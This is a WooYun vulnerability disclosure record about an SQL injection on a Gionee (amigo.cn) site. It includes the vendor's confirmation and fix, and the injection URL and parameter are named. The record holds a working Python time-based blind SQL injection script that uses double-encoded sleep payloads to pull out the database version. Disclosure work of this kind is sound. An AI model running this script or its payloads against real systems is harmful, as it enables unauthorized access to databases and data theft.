{"id": 73101, "wybug_id": "wooyun-2016-0169052", "wybug_title": "金立OS主站SQL注入（附py脚本）", "wybug_corp": "gionee.com", "wybug_author": "null_z", "wybug_date": "2016-01-11 11:58", "wybug_open_date": "2016-01-30 09:09", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-30：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： ～～～～～ 详细说明：  注入点http://www.amigo.cn/ami_stat/ami_stat.php?val2=undefined&val1=111*&type=search注入参数为val1正常检测不出来，需要doubleencode一下。目测后面代码类似这样\n$id=$_GET['id'];    $id=addslashes($id);    echo $id.\"</br>\";    $id=urldecode($id);    echo $id.\"</br>\";\n先addslashes 然后url解码了，所以需要将payload先编码再注入。基于时间的盲注很慢，猜解version前十位脚本如下\n#!/usr/bin/env python#-*-codnig:utf-8-*-import requestsfrom urllib import quoteimport timeurl = 'http://www.amigo.cn/ami_stat/ami_stat.php?val2=undefined&val1={}&type=search'payloads = '0123456789.abcdefghijklmnopqrstuvwxyz @_:'user = ''for i in range(1,10):\tfor p in payloads:\t\tstart_time = time.time()\t\ttry:\t\t\tkey = \" 11' xor if(ascii(mid(version(),{},1))={},sleep(5),1) and '1'='1\".format(i,ord(p))\t\t\tu = url.format(quote(quote(key)))\t\t\treq = requests.get(u,timeout=60)\t\texcept Exception,msg:\t\t\tprint msg\t\tprint key\t\tif time.time() - start_time > 5:\t\t\tuser = user + p\t\t\tprint \"\\n\" + user + \"\\n\"\t\t\tbreakprint '\\n\\nFinish: ' + user\n   漏洞证明：  \n\n   修复方案：  你懂的～～～～   版权声明：转载请注明来源 null_z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-01-11 12:35 厂商回复： 谢谢，我们尽快安排相关同事进行修复。 最新状态： 2016-01-30：已经修复，谢谢 2016-01-30：已经修复  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}